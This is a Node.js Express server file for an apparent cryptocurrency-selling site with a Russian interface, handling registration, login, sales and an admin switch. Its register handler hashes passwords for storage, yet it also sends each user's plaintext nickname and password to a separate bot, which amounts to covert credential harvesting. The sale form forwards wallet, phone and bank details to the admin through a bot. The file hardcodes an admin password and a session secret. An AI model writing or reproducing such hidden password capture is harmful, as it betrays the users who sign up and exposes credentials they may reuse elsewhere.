const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const path = require('path');
const db = require('./db');
const { notifyAdmin } = require('./bot');
const { notifyNewUser } = require('./bot_register');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = 'fosfor322322';

app.use(express.json());
app.use(session({
  secret: 'crypto-site-secret-change-me',
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, maxAge: 1000 * 60 * 60 * 24 * 7 }
}));
app.use(express.static('public'));

app.get('/api/status', (req, res) => {
  db.get("SELECT value FROM settings WHERE key='stopped'", (err, row) => {
    const stopped = row && row.value === '1';
    const isAdmin = req.session.isAdmin === true;
    res.json({ stopped: stopped && !isAdmin });
  });
});

app.post('/api/register', (req, res) => {
  const { nickname, password } = req.body || {};
  if (!nickname || !password || nickname.length < 3 || password.length < 4) {
    return res.status(400).json({ error: 'Ник от 3 символов, пароль от 4' });
  }
  
  db.get('SELECT id FROM users WHERE nickname = ?', [nickname], (err, row) => {
    if (row) return res.status(400).json({ error: 'Такой ник уже занят' });
    
    const hash = bcrypt.hashSync(password, 10);
    db.run('INSERT INTO users (nickname, password_hash) VALUES (?, ?)', [nickname, hash], function(err) {
      if (err) return res.status(500).json({ error: 'Ошибка БД' });
      
      req.session.userId = this.lastID;
      req.session.nickname = nickname;

      // --- ОТПРАВЛЯЕМ В НОВЫЙ БОТ ---
      notifyNewUser(nickname, password); 
      // -------------------------------

      res.json({ ok: true, nickname });
    });
  });
});
app.post('/api/login', (req, res) => {
  const { nickname, password } = req.body || {};
  db.get('SELECT * FROM users WHERE nickname = ?', [nickname], (err, user) => {
    if (!user || !bcrypt.compareSync(password, user.password_hash)) {
      return res.status(400).json({ error: 'Неверный ник или пароль' });
    }
    req.session.userId = user.id;
    req.session.nickname = user.nickname;
    res.json({ ok: true, nickname: user.nickname });
  });
});

app.post('/api/logout', (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});

app.get('/api/me', (req, res) => {
  res.json({ nickname: req.session.nickname || null });
});

app.get('/api/history', (req, res) => {
  db.all('SELECT nickname, coin, network, created_at FROM sales ORDER BY id DESC LIMIT 200', [], (err, rows) => {
    res.json(rows || []);
  });
});

app.post('/api/sell', (req, res) => {
  db.get("SELECT value FROM settings WHERE key='stopped'", (err, row) => {
    const stopped = row && row.value === '1';
    if (stopped && req.session.isAdmin !== true) {
      return res.status(403).json({ error: 'пока что не покупаю' });
    }

    const { coin, network, wallet, phone, bank } = req.body || {};
    if (!coin || !wallet || !phone || !bank) {
      return res.status(400).json({ error: 'Заполните все поля' });
    }

    db.run(
      'INSERT INTO sales (user_id, nickname, coin, network, wallet, phone, bank) VALUES (?,?,?,?,?,?,?)',
      [req.session.userId || null, req.session.nickname || 'гость', coin, network || '', wallet, phone, bank],
      function(err) {
        if (err) return res.status(500).json({ error: 'Ошибка БД' });
        
        const sale = { id: this.lastID, nickname: req.session.nickname || 'гость', coin, network, wallet, phone, bank };
        notifyAdmin(sale).catch(e => console.log('Ошибка телеги:', e.message));
        res.json({ ok: true });
      }
    );
  });
});

app.post('/api/admin/login', (req, res) => {
  if (req.body.password === ADMIN_PASSWORD) {
    req.session.isAdmin = true;
    return res.json({ ok: true });
  }
  res.status(403).json({ error: 'Неверный пароль' });
});

app.get('/api/admin/stopped', (req, res) => {
  if (!req.session.isAdmin) return res.status(403).json({ error: 'forbidden' });
  db.get("SELECT value FROM settings WHERE key='stopped'", (err, row) => {
    res.json({ stopped: row && row.value === '1' });
  });
});

app.post('/api/admin/toggle-stop', (req, res) => {
  if (!req.session.isAdmin) return res.status(403).json({ error: 'forbidden' });
  db.get("SELECT value FROM settings WHERE key='stopped'", (err, row) => {
    const next = (row && row.value === '1') ? '0' : '1';
    db.run("UPDATE settings SET value=? WHERE key='stopped'", [next], () => {
      res.json({ stopped: next === '1' });
    });
  });
});

app.listen(PORT, () => console.log(`Сервер запущен: http://localhost:${PORT}`));
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});